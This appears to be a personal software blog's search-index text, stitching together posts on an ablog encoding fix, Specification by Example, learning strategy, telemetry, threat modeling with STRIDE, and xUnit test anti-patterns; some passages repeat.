isfile(conf) and 'ablog' in open(conf).read(): File \"c:\\users\\wubw\\appdata\\local\\programs\\python\\python36-32\\lib\\encodings\\cp1252.py\", line 23, in decode return codecs.charmap_decode(input,self.errors,decoding_table)[0] UnicodeDecodeError: 'charmap' codec can't decode byte 0x9d in position 583: character maps to <undefined> It is an encoding issue in the ablog library, open the commands.py mentioned in the error message and go to the error line. The fix is to add encoding parameter: if isfile(conf) and 'ablog' in open(conf, encoding=\"utf8\").read(): return confdir In Linux/Mac and some Windows OS, the build process may complain about fail to create a _website/blog. Manually create it should bypass the issue. ablog deploy error When I run ablog deploy on Windows 10, it fails due to some mysterious errors. But when I run the same command on Mac and Ubuntu, I manage to deploy the blog to the target repository. Currently, I cannot figure out what is the root course of the error. Then the workaround is to deploy from Mac or Ubuntu, or setup some virtual machines? Chinese blog issue When my blog contains Chinese characters, I encounter mysterious errors in atom feed generation. After some investigation, the error disappears if excerpt does not contain Chinese characters. Enhance the blog You can enhance/customize your blog, e.g. support discussion by using Disqus, monitoring usage by using Google Analytics.

With Specification by Example, teams write just enough documentation to facilitate change effectively in short iterations (Scrum or XP) or in flow-based development (Kanban). Table of Contents Introduction \u201cThe hardest single part of building a software system is deciding precisely what to build.\u201d -- The Mythical Man-Month \u201cThe formulation of a problem is often more essential than its solution.\u201d -- Albert Einstein Specification by Example is to address the above questions. Besides that, Specification by Example also ensure documentation agile teams need to build is: Precise and objectively testable Easy to maintain Written just-in-time What is a specification A specification should be Precise and testable A true specification, not a script About business functionality, not about software design Once the functionality is implemented, the specification that describes it will serve a different purpose. It will document what the system does and alert us about functional regression. To be effective in these goals, a specification should be Self explanatory Focused In domain language An example of a very good specification with examples is shown here. Free delivery Free delivery is offered to VIP customers once they purchase a certain number of books. Free delivery is not offered to regular customers or VIP customers buying anything else than books. Given that the minimum number of books to get free delivery is five, then we expect the following: Difference from user stories User stories generally have three parts: \u201cAs a __ I want __ in order to __ .\u201d Alternative formats exist, but all have these three components. As a process, Specification by Example works both for high-level and lower-level stories. Once we have a high-level example of how something would be useful, we can capture that as a high-level specification. Such high-level examples allow us to objectively measure whether we\u2019ve delivered a feature. User stories have to fit into the sprint. When there is a bunch of those that are done, they\u2019re tested in isolation. The larger user story isn\u2019t actually tested. When the user stories are small grained you can\u2019t really tell from the backlog whether things are really done. Difference from scripts A specification does not say anything about application workflow or session constraints. A script explains how something can be tested. It describes business functionality through lower-level interactions with a system. A script requires the reader to work back from the actions and understand what\u2019s really important and what exactly is being illustrated. Scripts also bake the test into workflow and session constraints, which might change in the future even when the underlying business rules don\u2019t change. A specification explains what the system does. It focuses on the business functionality in the most direct way possible. Specifications are shorter because they describe the business concepts directly. That makes them easier to read and understand than scripts. Specifications are also a lot more stable than scripts, because they won\u2019t be affected by changes in workflow and session constraints. Watch out for descriptions of flows (first do this, then do that, ...). Unless specifying a genuine process flow, this is often a sign that a business rule is illustrated using a script. Such scripts will cause a lot of long-term maintenance problems. The specification should explain what should it do rather than how should it work. Difference from software design Ideally, a specification should not imply software design. It should explain the business functionality without prescribing how it\u2019s going to be implemented in software. This serves two purposes: It allows developers to find the best possible solution now. It allows developers to improve the design in the future. Specifications that focus on business functionality, without describing the implementation, enable the implementation to change more easily. A specification that does not say anything about software design won\u2019t need to change when the design improves. Key process patterns The key process patterns of Specification by Example are: Deriving scope from goals Specifying collaboratively Illustrating specifications using examples Refining the specifications Automating validation without changing the specifications Validating the system frequently Evolving living documentation. Deriving scope from goals Feature Injection It\u2019s a popular name for extracting the scope of a project from the business goals. And it is a technique to iteratively derive scope from goals through high-level examples. Effect mapping A visualization technique for project scope through hierarchical analysis of goals, stakeholders, and features. User story mapping A hierarchical mapping technique for user stories that provides a \u201cbig picture\u201d view. Specifying collaboratively Everyone in the team should be involved in Specification by Example. Specifying collaboratively is a great way to build a shared understanding of what needs to be done and to ensure that different aspects of a system are covered by the specifications. Collaboration also helps teams produce specifications that are easy to understand and tests that are easy to maintain. Have team members review stories early When: Analysts/domain experts are a bottleneck A \u201ccell\u201d consisting of two developers and a tester reviews each story early on to prepare for the meeting with the product owner, identifying any open questions. Specification by Example relies heavily on collaboration between business users and delivery team members. Everyone on the delivery team shares the responsibility for the right specifications. Programmers and testers have to offer input about the technical implementation and the validation aspects. Most teams collaborate on specifications in two phases: Someone works up front to prepare initial examples for a feature, and then those who have a stake in the feature discuss it, adding examples to clarify or complete the specification. The balance between the work done in preparation and the work done during collaboration depends on several factors: the maturity of the product, the level of domain knowledge in the delivery team, typical change request complexity, process bottlenecks, and availability of business users. There are many different ways to collaborate Many teams found that, at the start, big workshops were useful as a means to transfer the domain knowledge and align the expectations of developers, testers, and business analysts and stakeholders. But the majority of teams stopped doing big workshops after a while because they discovered that they\u2019re hard to coordinate and cost too much in terms of people\u2019s time. Another approach is to run smaller workshops that involve one developer, one tester, and one business analyst. A popular name for such meetings is Three Amigos. Or let someone in the team works on specification alone first. To check if a specification is self-explanatory, get someone else to look at the document and try to understand it, without you saying a word about it. Collaborate on defining the language When: Choosing not to run specification workshops If you decide not to run big workshops and instead use one of the alternative approaches, make sure to collaborate on defining the language. Illustrating specifications using examples Examples are a good tool for avoiding communication problems, which is a very effective way to communicate domain knowledge and ensure a shared understanding. Because examples are concrete and unambiguous, they\u2019re an ideal tool for making requirements precise. This is why we use them to clarify meaning in everyday communication, and use them consistently in analysis, development, and testing. A specification that defines three key examples properly is much more useful than one that specifies a hundred examples poorly. A representative example illustrating each important aspect of business functionality. Business users, analysts, or customers will typically define these. An example illustrating each important technical edge case, such as technical boundary conditions. Developers will typically suggest such examples when they\u2019re concerned about functional gaps or inconsistencies. Business users, analysts, or customers will define the correct expected behavior. An example illustrating each particularly troublesome area of the expected implementation, such as cases that caused bugs in the past and boundary conditions that might not be explicitly illustrated by previous examples. Testers will typically suggest these, and business users, analysts, or customers will define the correct behavior. Avoid using abstract classes of equivalence When: You can specify a concrete example Classes of values have to be translated into something concrete for automation, which means that whoever automates the validations will have to translate the specifications into automation code. This means more opportunities for misunderstanding and misinterpretation. We should have enough examples to describe the entire scope of a feature Refining the specifications Collaboration on refining the specification/requirements builds trust between stakeholders and delivery team members. And collaboration requires preparation For teams who worked on projects where the requirements were vague and required a lot of upfront analysis, the preparation phase started two weeks before the collaborative workshop. This allowed analysts to talk to business users, collect examples from them, and start refining the examples. Teams that had more stable requirements started working on examples a few days before, collecting the obvious open questions and addressing them. All these approaches help to run a bigger workshop more efficiently. Automating validation without changing the specifications Use \u201cGiven-When-Then\u201d language in specifications In order to: Make the test easier to understand As a rule of thumb, a specification should declare the context, specify a single action, and then define the expected post-conditions. (Or Arrange-Act-Assert) When deciding whether to automate the validation of specifications using a technical tool or one for executable specifications, think about which benefits you want to get out of it. If we automate examples with a technical tool, we get easier automation and cheaper maintenance but lose the ability to use them for communication with business users later. We get very good regression tests, but the specifications will be accessible only to developers. Depending on your context, this might or might not be acceptable. Don\u2019t check business logic through the user interface Automating just below the skin of the application is a good way to reuse real business flows and avoid duplication in the automation layer. Executing the checks directly using HTTP calls, not through a browser. Speeds up validation significantly and makes it possible to run checks in parallel. Validating the system frequently Automate and include validating in the continuous integration process. Don\u2019t postpone or delegate automation Because of the automation overhead, some teams delayed it. They described specifications with examples and then wrote code, leaving the automation for later. Evolving living documentation Long-term value comes from living documentation Use test-driven development as a stepping stone When: Developers have a good understanding of TDD Explain Specification by Example as the process of gathering examples to clarify requirements, deriving tests, and automating them. Our focus is on collaboration and process change rather than tool. Keep executable specifications in a version control system. Don\u2019t treat automation code as second-grade code What typically happens on projects is they put a junior programmer to write the tests and the test system. However, automated test systems are difficult to get right. Junior programmers tend to choose the wrong approximations and build something less reliable. Put your best architects on it. They have the power to say: if we change this in our design, it will make it much better and easier to get tested. Good practices Base the specification language on personas Document your building blocks It\u2019s good practice to document the building blocks for specifications; this helps people reuse components and keep the language consistent. Avoid making up your own data When: Data-driven projects Using real data is important on data-driven projects, when a great deal can depend on slight variations and inconsistencies. Get precise performance requirements When: Performance is a key feature Use a checklist for discussions When: Cross-cutting concerns A checklist for discussions will ensure that you begin to consider all the important questions when reviewing a story. You can use it to decide which of the cross-cutting concerns apply to a particular story and then focus on illustrating those aspects. Avoid writing specifications that are tightly coupled with code Specifications that are tightly coupled with code and closely reflect the software implementation result in tests that are brittle. Technical tests are important, and I\u2019m not arguing against having such tests that are closely coupled with the software design. But such tests should not be mixed with executable specifications. A common mistake for teams starting with Specification by Example is to drop all technical tests, such as the ones at the unit or integration level, and expect that executable specifications will cover all aspects of the system. Executable specifications guide us in delivering the right business functionality. Technical tests ensure that we look at low-level technical quality aspects of the system. We need both, but we should not mix them. Technical test automation tools are much better suited for technical tests than the tools we use to automate executable specifications. They\u2019ll enable the team to maintain such tests much easier. To learn about tools, try a simple project first When: Working on a legacy system Avoid recorded UI tests Many traditional test automation tools offer record-and-replay user interface automation. Although this sounds compelling for initial automation, record-and-replay is a terrible choice for Specification by Example. This is one of the areas where automation of executable specifications is quite different than traditional automated regression testing. Avoid recording user interface automation if you can. Apart from being almost impossible to understand, recorded scripts are difficult to maintain. They reduce the cost of creating a script but significantly increase the cost of maintenance. Specifications should be described at the business rule level. The automation layer should handle the workflow level by combining blocks composed at the technical activity level. Such tests will be easy to understand, efficient to write, and relatively inexpensive to maintain. Refined specifications should be automated with as little change as possible. The automation layer should define how something is tested; specifications should define what is to be tested. Use the automation layer to translate between the business language and user interface concepts, APIs, and databases. Create higher-level reusable components for specifications. Automate below the user interface if possible. Don\u2019t rely too much on existing data if you don\u2019t have to. Validate executable specifications frequently to keep them reliable. Compared to continuous integration with unit tests, the two main challenges for continuous validation are fast feedback and stability. Set up an isolated environment for continuous validation and fully automate deployments to make it more reliable. Look for ways to get faster feedback. Split quick and slow tests, create a pack for current iteration specifications, and divide long-running packs of executable specifications into smaller packs. Don\u2019t just disable failing tests\u2014either fix the problems or move the tests to a pack for low-priority regression issues that\u2019s closely monitored. Organize current work by stories, Reorganize stories by functional areas User stories are excellent as a planning tool, but they aren\u2019t useful as a way to organize existing system functionality.

If we automate examples with a technical tool, we get easier automation and cheaper maintenance but lose the ability to use them for communication with business users later. We get very good regression tests, but the specifications will be accessible only to developers. Depending on your context, this might or might not be acceptable. Don\u2019t check business logic through the user interface Automating just below the skin of the application is a good way to reuse real business flows and avoid duplication in the automation layer. Executing the checks directly using HTTP calls, not through a browser. Speeds up validation significantly and makes it possible to run checks in parallel.","title":"Automating validation without changing the specifications"},{"location":"2017/specification_by_example/#validating-the-system-frequently","text":"Automate and include validating in the continuous integration process. Don\u2019t postpone or delegate automation Because of the automation overhead, some teams delayed it.

Our focus is on collaboration and process change rather than tool. Keep executable specifications in a version control system. Don\u2019t treat automation code as second-grade code What typically happens on projects is they put a junior programmer to write the tests and the test system. However, automated test systems are difficult to get right. Junior programmers tend to choose the wrong approximations and build something less reliable. Put your best architects on it. They have the power to say: if we change this in our design, it will make it much better and easier to get tested.","title":"Evolving living documentation"},{"location":"2017/specification_by_example/#good-practices","text":"Base the specification language on personas Document your building blocks It\u2019s good practice to document the building blocks for specifications; this helps people reuse components and keep the language consistent. Avoid making up your own data When: Data-driven projects Using real data is important on data-driven projects, when a great deal can depend on slight variations and inconsistencies. Get precise performance requirements When: Performance is a key feature Use a checklist for discussions When: Cross-cutting concerns A checklist for discussions will ensure that you begin to consider all the important questions when reviewing a story. You can use it to decide which of the cross-cutting concerns apply to a particular story and then focus on illustrating those aspects. Avoid writing specifications that are tightly coupled with code Specifications that are tightly coupled with code and closely reflect the software implementation result in tests that are brittle. Technical tests are important, and I\u2019m not arguing against having such tests that are closely coupled with the software design. But such tests should not be mixed with executable specifications. A common mistake for teams starting with Specification by Example is to drop all technical tests, such as the ones at the unit or integration level, and expect that executable specifications will cover all aspects of the system. Executable specifications guide us in delivering the right business functionality. Technical tests ensure that we look at low-level technical quality aspects of the system. We need both, but we should not mix them. Technical test automation tools are much better suited for technical tests than the tools we use to automate executable specifications. They\u2019ll enable the team to maintain such tests much easier. To learn about tools, try a simple project first When: Working on a legacy system Avoid recorded UI tests Many traditional test automation tools offer record-and-replay user interface automation. Although this sounds compelling for initial automation, record-and-replay is a terrible choice for Specification by Example. This is one of the areas where automation of executable specifications is quite different than traditional automated regression testing. Avoid recording user interface automation if you can. Apart from being almost impossible to understand, recorded scripts are difficult to maintain. They reduce the cost of creating a script but significantly increase the cost of maintenance. Specifications should be described at the business rule level. The automation layer should handle the workflow level by combining blocks composed at the technical activity level. Such tests will be easy to understand, efficient to write, and relatively inexpensive to maintain. Refined specifications should be automated with as little change as possible. The automation layer should define how something is tested; specifications should define what is to be tested. Use the automation layer to translate between the business language and user interface concepts, APIs, and databases. Create higher-level reusable components for specifications. Automate below the user interface if possible. Don\u2019t rely too much on existing data if you don\u2019t have to. Validate executable specifications frequently to keep them reliable. Compared to continuous integration with unit tests, the two main challenges for continuous validation are fast feedback and stability. Set up an isolated environment for continuous validation and fully automate deployments to make it more reliable. Look for ways to get faster feedback. Split quick and slow tests, create a pack for current iteration specifications, and divide long-running packs of executable specifications into smaller packs. Don\u2019t just disable failing tests\u2014either fix the problems or move the tests to a pack for low-priority regression issues that\u2019s closely monitored. Organize current work by stories, Reorganize stories by functional areas User stories are excellent as a planning tool, but they aren\u2019t useful as a way to organize existing system functionality.

I promise you will get the answer very soon. :) Technology Adoption Lifecycle First it is simply impossible that you can catch-up all the state-of-art technologies. And there is nothing wrong you decide to wait or skip parts of them. Every technology has its adoption life cycle. You can choose your strategy whether/when to learn a specific technology, and each phase has its pros and cons. If you position yourself on the edge, once there is position you will have strong opportunity to get that with good pay. However the chance may be limited If everybody is learning something popular, it will have the risk of superfluous supply even though the demand may be high. Late entrance may be also good, that you know the techniques are good and not just cool. And the you can get a lot of mature materials and robust infrastructure. From the finance perspective: the \"price\" of the technology depends on the both demand and supply. If the demand is higher than supply, then it is big opportunity. On the opposite, if the demand is lower than the supply, then it is a threat. Then to spend our time on high demand/low supply will be an obvious choice.

Build Your Own Foundation The hot skills are changing continuously, You can't know everything You can't keep up with what's new You need to predict potential important skills for next decade, refresh yourself continuously, do not invest all in one skill in order to lower the risks. You have to build your own foundation: Learn Learn how to learn Learn what not to learn and where to stop Learn the fundamentals Learning on demand Don't Don't believe marketing hype Don't always follow the money (but always know where it is) Don't let your specialization become your identity Breadth vs Depth Breadth: build a foundation in multiple subject area Depth: briefly specialize in targeted subjects as needed You have your own interests area, your specific personality and your own family situation. The above items vary from people to people, you need to think through them thoroughly and have your own foundation/principle to learn new technology. When you build your own foundation, then it can help you to drive the process to move forward on learning the new technology and keep updated. Learning Tracks If you want to learn new technology, which can be fell into following tracks: Build fundamental knowledge on some areas Get information Build skills Become expert Fundamentals Is widely applicable which is not bound to one particular implementation Rarely becomes obsolete: fundamental knowledge can last a lifetime Can helps you to learn and process information Ensure you spare enough time to build-up solid fundamental knowledge, which will be a very good investment! Information Specific knowledge you use to solve problems When working on an existing project, people mainly will focus on Information part rather than Fundamental part May be bind to a specific tools/technology, are easier to 'fall behind'. Be careful to spend too much energy to purely to build-up information knowledge, after several years they may be outdated. Skills The ability to use knowledge to solve problems This part is where you get paid. People rarely pay what you know, they pay what you can do (information vs skills) Practice is essential to build-up skills. Fundamentals and Information are important ingredients to build-up skills too. Expertise & Innovation Experts have access to the fundamental knowledge, information and skills that are required to do so. To become competent: study, search for solutions, practice skills To become an expert/innovator: Experimentation, research, perseverance Please be aware that expertise can help you get more work as consultant, speaker or author, but is rarely the most effective way to increase income. One of the reason to choose this track is the innovation track itself can also be a lot of fun.

This blog will explain what is telemetry technology, how we can benefit from telemetry technology, and briefly discuss some technical choices. Table of Contents What is Telemetry According to Wikipedia: Telemetry is an automated communications process by which measurements and other data are collected at remote or inaccessible points and transmitted to receiving equipment for monitoring. Telemetry technology is heavily used in our life, e.g. monitoring in hospital. In software world, Telemetry plays similar role. Imaging 20 years ago, most software is still standalone desktop applications and internet is not widely used. It is not straight-forward to know why software goes wrong and how software is used. You had to ask users directly, or asked them to send 'core-dump' to address the software errors. Nowadays, more and more software is running on web, on mobile devices and in the 'cloud'. We have better position to get telemetry data due to the better infrastructure. There is risk that you will lose the competitive power if your competitors use the telemetry data while you do not. Telemetry technology becomes crucial to the software business. You need to understand whether the servers are performing well, whether your software is healthy and how your software is used. The information is critical to your business, and you will find the details in the next chapter. Usage of Telemetry In software industry, how we are going to benefit from telemetry technology? The following scenarios are relevant to telemetry technology. Health monitoring We are curious about whether a system is healthy, whether it is running and capable of processing requests. Availability monitoring A truly healthy system requires that the components and subsystems that compose the system are available. Availability monitoring is closely related to health monitoring. Performance monitoring As the system is placed under more and more stress (e.g. by increasing the volume of users), the size of the datasets that these users access grows and the possibility of failure of one or more components becomes more likely. Frequently, component failure is preceded by a decrease in performance. If you're able detect such a decrease, you can take proactive steps to remedy the situation. Performance trending Performance trending chart is useful to show how software performs under stress. To know whether the performance is improved or become worse and identify the hotspots. Auto scaling Auto scaling can be a proactive action if performance becomes worse due to increased workload. Security monitoring All commercial systems that include sensitive data must implement a security structure. You must be prepared to monitor all requests to all resources regardless of the source of these requests. For example: * A large number of failed sign-in attempts might indicate a brute-force attack. * An unexpected surge in requests might be the result of a distributed denial-of-service (DDoS) attack. * A system that has a sign-in vulnerability might accidentally expose resources to the outside world without requiring a user to actually sign in. SLA monitoring Many commercial systems that support paying customers make guarantees about the performance of the system in the form of SLAs. Essentially, SLAs state that the system can handle a defined volume of work within an agreed time frame and without losing critical information. SLA monitoring is concerned with ensuring that the system can meet measurable SLAs. Auditing Depending on the nature of the application, there might be statutory or other legal regulations that specify requirements for auditing users' operations and recording all data access. Auditing can provide evidence that links customers to specific requests. Non-repudiation is an important factor in many e-business systems to help maintain trust be between a customer and the organization that's responsible for the application or service. Usage monitoring Usage monitoring tracks how the features and components of an application are used. Facilitate decision making Determine which features are heavily used and which are infrequently used. Evaluation can be done on the business value of features, design of the software, and identify potential hotspots in the system. This information can be used for capacity planning as the number of customers grows. Detect (possibly indirectly) user satisfaction with the performance or functionality of the system. Billing & enforce quota A commercial application or multitenant service might charge customers for the resources that they use. If a user in a multitenant system exceeds their paid quota of processing time or resource usage during a specified period, their access can be limited or processing can be throttled. Issue tracking Customers and other users might report issues if unexpected events or behavior occurs in the system. Issue tracking is concerned with managing these issues, associating them with efforts to resolve any underlying problems in the system, and informing customers of possible resolutions. The information will help a lot for: Root cause analysis Trouble shooting Technical choices overview There are several technical choices in telemetry. Please be aware the technique is changing rapidly in this area, it is a moving target. You have to refresh the knowledge from time to time to catch up the latest changes. Microsoft Stack Application Insight Very easy to use for web apps, you can get a lot of telemetry data/charts out-of-box. Azure Log Analytics also provides search functionality. Smooth integration to other Microsoft tools, e.g. PowerBI HockeyApp Telemetry tool for mobile apps. PowerBI Handy tool for dashboard/report/chart. Elastic Stack Elasticsearch Elasticsearch is on a mission to organize data and make it easily accessible. Logstash Logstash is the central dataflow engine in the Elastic Stack for gathering, enriching, and unifying all of your data regardless of format or schema. Kibana Kibana is a window into the Elastic Stack. It enables visual exploration and real-time analysis of your data in Elasticsearch.

With more and more data and software go to internet, the security becomes crucial for software development. OWASP (Open Web Application Security Project) lists top 10 security risks: Injection Broken Authentication and session management Cross-site scripting Insecure Direct Object Reference Security Misconfiguration Sensitive data exposure Missing function level access control Cross site request forging Components with known vulnerabilities Invalidated requests and forwards Security risks are everywhere and it is difficult to make secure software. Threat modeling is a systematic way to ensure that your software is designed for security. This blog explains briefly what is threat modeling. Table of Contents Thrust boundaries Identify thrust boundaries is the first step, which is equivalent to attack surface. There are several ways to identify thrust boundaries by: Accounts Network interfaces Different physical computers Virtual machines Organizational boundaries Almost everywhere you can argue for different privilege STRIDE \u2018STRIDE\u2019 is mnemonic way to describe threat types. Spoofing: Pretending to be something or someone you\u2019re not Tampering: Modifying something you\u2019re not supposed to modify. It can include packets on the wire (or wireless network), bits on disks or bits in memory. Repudiation: Means claiming you didn\u2019t do something (regardless of whether you did or not) Information disclosure: Exposing information to people who are not authorized to see it. Denial of service: Attacks designed to prevent a system from providing service, including by crashing it, making it unusually slow, or filling all its storage. Elevation of privilege: A program or user is technically able to do things that they are not supposed to do. Actions strategy For each threat, you can have different action strategy accordingly. Mitigate threats: Doing things to make it harder to take advantage of a threat. Eliminate threats: It is almost always achieved by eliminating features. Transferring threats: It is about letting someone or something else handle the risk. Accepting the risk: It is the final approach to addressing threats. Authentication: Mitigating Spoofing In general, only programs running at the same or lower level of trust are spoofable, and you should endeavor to trust only code running at a higher level of trust, such as in the OS. Tactics for authentication Without crypto: for example, verify IP or DNS entry which is unreliable Using crypto: That validation cannot be delegated entirely to machines. You can choose to delegate it to one or the many companies that assert they validate these things. For example: PKI (public key infrastructure); CA (certification authorities) PKI is a cryptographic technique that enables entities to securely communicate on an insecure public network, and reliably verify the identity of an entity via digital signatures. A PKI is an arrangement that binds public keys with respective identities of entities (like people and organizations). The binding is established through a process of registration and issuance of certificates at and by a certificate authority (CA). Authentication technologies For computer (or accounts): IPSec, DNSSEC, SSH host keys, Kerberos authentication, HTTP Digest or Basic authentication, Windows authentication (NTLM), PKI system, such as SSL or TLS with certificates For bits (files, messages, etc): Digital signatures, hashes For people: Something you know, e.g. password; Something you have, e.g. access card; Something you are, e.g. biometrics, photo graphs; Something you know who can authenticate you For maintaining authentication across connection, e.g. Cookies Developer ways to address spoofing: Within an operating system, you should aim to use full and canonical path names for libraries, pipes, and so on to help mitigate spoofing. Integrity: Mitigating Tampering Tactics Relying on system defense such as permission Use cryptographic mechanisms Use of logging technology and audit activities as a deterrent If you are implementing a permission system, you should ensure that there\u2019s a single permission kernel also called a reference monitor. The most important element of assuring integrity is about process, not technology.

Xunit Test Pattern is a fantastic book which shares the experience and good practice to write tests. Table of Contents Test Introduction Easy to run tests What makes tests easy to run? Four specific goals answer this question: They must be Fully Automated Tests so they can be run without any effort. They must be Self-Checking Tests so they can detect and report any errors without manual inspection. They must be Repeatable Tests so they can be run multiple times with the same result. Ideally, each test should be an Independent Test that can be run by itself. Our tests should be small and test one thing at a time. The major exception to the mandate to keep Test Methods short occurs with customer tests that express real usage scenarios of the application. Such extended tests offer a useful way to document how a potential user of the software would go about using it; if these interactions involve long sequences of steps, the Test Methods should reflect this reality. Purpose of Tests Customer tests Verify the behavior of the entire system or application. They typically correspond to scenarios of one or more use cases, features, or user stories. These tests often go by other names such as functional tests, acceptance tests, or end-user tests. Although they may be automated by developers, their key characteristic is that an end user should be able to recognize the behavior specified by the test even if the user cannot read the test representation. Unit tests Verify the behavior of a single class or method that is a consequence of a design decision. This behavior is typically not directly related to the requirements except when a key chunk of business logic is encapsulated within the class or method in question. These tests are written by developers for their own use; they help developers describe what \u201cdone looks like\u201d by summarizing the behavior of the unit in the form of tests. Component tests Verify components consisting of groups of classes that collectively provide some service. They fit somewhere between unit tests and customer tests in terms of the size of the SUT (System under test) being verified. Although some people call these \u201cintegration tests\u201d or \u201csubsystem tests,\u201d those terms can mean something entirely different from \u201ctests of a specific larger-grained subcomponent of the overall system.\u201d Fault insertion tests Typically show up at all three levels of granularity within these functional tests, with different kinds of faults being inserted at each level. From a test automation strategy point of view, fault insertion is just another set of tests at the unit and component test levels. Things get more interesting at the whole-application level, however. Inserting faults here can be hard to automate because it is challenging to automate insertion of the faults without replacing parts of the application. Property Tests Performance tests verify various \u201cnonfunctional\u201d (also known as \u201cextra-functional\u201d or \u201ccross-functional\u201d) requirements of the system. These requirements are different in that they span the various kinds of functionality. They often correspond to the architectural \u201c-ilities.\u201d These kinds of tests include Response time tests Capacity tests Stress tests From a test automation perspective, many of these tests must be automated (at least partially) because human testers would have a hard time creating enough load to verify the behavior under stress. While we can run the same test many times in a row in xUnit, the xUnit framework is not particularly well suited to automating performance tests. Usability Tests Usability tests verify \u201cfitness for purpose\u201d by confirming that real users can use the software application to achieve the stated goals. These tests are very difficult to automate because they require subjective assessment by people regarding how easy it is to use the SUT. For this reason, usability tests are rarely automated and will not be discussed further in this book. Exploratory Testing Exploratory testing is a way to determine whether the product is self-consistent. The testers use the product, observe how it behaves, form hypotheses, design tests to verify those hypotheses, and exercise the product with them. By its very nature, exploratory testing cannot be automated, although automated tests can be used to set up the SUT in preparation for doing exploratory testing. Tests and Continuous Integration By organizing the unit tests and customer tests into separate test suites, we ensure that we can run just the unit tests or just the customer tests if necessary. The unit tests should always pass before we check them in. To ensure that the unit tests are run frequently, we can include them in the Smoke Tests that are run as part of the Integration Build. Although many of the customer tests will fail until the corresponding functionality is built, it is nevertheless useful to run all the passing customer tests as part of the integration build phase\u2014but only if this step does not slow the build down too much. In that case, we can leave them out of the check-in build and simply run them every night. System level tests cannot be thorough TDD unit tests can be thorough Way of capturing tests Anti-Patterns Obscure Test It is difficult to understand the test at a glance. Automated tests should serve at least two purposes. First, they should act as documentation of how the SUT should behave; we call this Tests as Documentation. Second, they should be a self-verifying executable specification. Cause: Mystery Guest The test reader is not able to see the cause and effect between fixture and verification logic because part of it is done outside the Test Method. Cause: General Fixture The test builds or references a larger fixture than is needed to verify the functionality in question. Cause: Irrelevant Information The test exposes a lot of irrelevant details about the fixture that distract the test reader from what really affects the behavior of the SUT. Cause: Hard-Coded Test Data Data values in the fixture, assertions, or arguments of the SUT are hard-coded in the Test Method, obscuring cause\u2013effect relationships between inputs and expected outputs. Cause: Indirect Testing The Test Method interacts with the SUT indirectly via another object, thereby making the interactions more complex. Conditional Test Logic A test contains code that may or may not be executed. In general, the tests should try to: Eliminating \u201cif\u201d Statements Eliminating Loops Cause: Flexible Test The test code verifies different functionality depending on when or where it is run. Cause: Conditional Verification Logic Conditional Test Logic may also create problems when it is used to verify the expected outcome. This issue usually arises when the tester tries to prevent the execution of assertions if the SUT fails to return the right objects or uses loops to verify the contents of collections returned by the SUT. Cause: Production Logic in Test Symptoms: Some forms of Conditional Test Logic are found in the result verification section of our tests. Cause: Complex Teardown Symptoms: Complex fixture teardown code is more likely to leave the test environment corrupted if it does not clean up after itself correctly. It is hard to verify that teardown code has been written correctly, and such code can easily result in \u201cdata leaks\u201d that may later cause this or other tests to fail for no apparent reason. Cause: Multiple Test Conditions Symptoms: A test tries to apply the same test logic to many sets of input values, each with its own corresponding expected result. Hard-to-Test Code Code is difficult to test. Cause: Highly Coupled Code Symptoms: A class cannot be tested without also testing several other classes. Cause: Asynchronous Code Symptoms: A class cannot be tested via direct method calls. The test must start an executable (such as a thread, process, or application) and wait until its start-up has finished before interacting with the executable. Cause: Untestable Test Code Symptoms: The body of a Test Method is obscure enough (Obscure Test) or contains enough Conditional Test Logic that we wonder whether the test is correct. Test Code Duplication The same test code is repeated many times. Cause: Cut-and-Paste Code Reuse Cause: Reinventing the Wheel While Cut-and-Paste Code Reuse deliberately makes copies of existing code to reduce the effort of writing tests, it is also possible to accidentally write the same sequence of statements in different tests. Test Logic in Production The code that is put into production contains logic that should be exercised only during tests. The SUT may contain logic that cannot be run in a test environment. Tests may require the SUT to behave in specific ways to allow full test coverage. Cause: Test Hook Conditional logic within the SUT determines whether the \u201creal\u201d code or test specific logic is run. Cause: For Tests Only Code exists in the SUT strictly for use by tests. Cause: Test Dependency in Production Production executables depend on test executables. Cause: Equality Pollution Another cause of Test Logic in Production is the implementation of test-specific equality in the equals method of the SUT. Assertion Roulette It is hard to tell which of several assertions within the same test method caused a test failure. Cause: Eager Test A single test verifies too much functionality. Cause: Missing Assertion Message Symptoms: A test fails. Upon examining the output of the Test Runner, we cannot determine exactly which assertion failed. Erratic Test One or more tests behave erratically; sometimes they pass and sometimes they fail. Cause: Interacting Tests Tests depend on other tests in some way. Note that Interacting Test Suites and Lonely Test are specific variations of Interacting Tests. Cause: Interacting Test Suites In this special case of Interacting Tests, the tests are in different test suites. Cause: Lonely Test A Lonely Test is a special case of Interacting Tests. In this case, a test can be run as part of a suite but cannot be run by itself because it depends on something in a Shared Fixture that was created by another test or by suite-level fixture setup logic. We can address this problem by converting the test to use a Fresh Fixture or by adding Lazy Setup logic to the Lonely Test to allow it to run by itself. Cause: Resource Leakage Tests or the SUT consume finite resources. Cause: Resource Optimism A test that depends on external resources has non deterministic results depending on when or where it is run. Cause: Unrepeatable Test A test behaves differently the first time it is run compared with how it behaves on subsequent test runs. In effect, it is interacting with itself across test runs. Cause: Test Run War Test failures occur at random when several people are running tests simultaneously. Cause: Non deterministic Test Test failures occur at random, even when only a single Test Runner is running tests. Fragile Test A test fails to compile or run when the SUT is changed in ways that do not affect the part the test is exercising. Cause: Interface Sensitivity Interface Sensitivity occurs when a test fails to compile or run because some part of the interface of the SUT that the test uses has changed. Cause: Behavior Sensitivity Behavior Sensitivity occurs when changes to the SUT cause other tests to fail. Cause: Data Sensitivity Data Sensitivity occurs when a test fails because the data being used to test the SUT has been modified. This sensitivity most commonly arises when the contents of the test database change. Cause: Context Sensitivity Context Sensitivity occurs when a test fails because the state or behavior of the context in which the SUT executes has changed in some way. Cause: Overspecified Software A test says too much about how the software should be structured or behave. This form of Behavior Sensitivity is associated with the style of testing called Behavior Verification. It is characterized by extensive use of Mock Objects to build layer-crossing tests. The main issue is that the tests describe how the software should do something, not what it should achieve. That is, the tests will pass only if the software is implemented in a particular way. This problem can be avoided by applying the principle Use the Front Door First whenever possible to avoid encoding too much knowledge about the implementation of the SUT into the tests. Cause: Sensitive Equality Objects to be verified are converted to strings and compared with an expected string. This is an example of Behavior Sensitivity in that the test is sensitive to behavior that it is not in the business of verifying. We could also think of it as a case of Interface Sensitivity where the semantics of the interface have changed. Either way, the problem arises from the way the test was coded; using the string representations of objects for verifying them against expected values is just asking for trouble. Cause: Fragile Fixture When a Standard Fixture is modified to accommodate a new test, several other tests fail. This is an alias for either Data Sensitivity or Context Sensitivity depending on the nature of the fixture in question. Frequent Debugging Manual debugging is required to 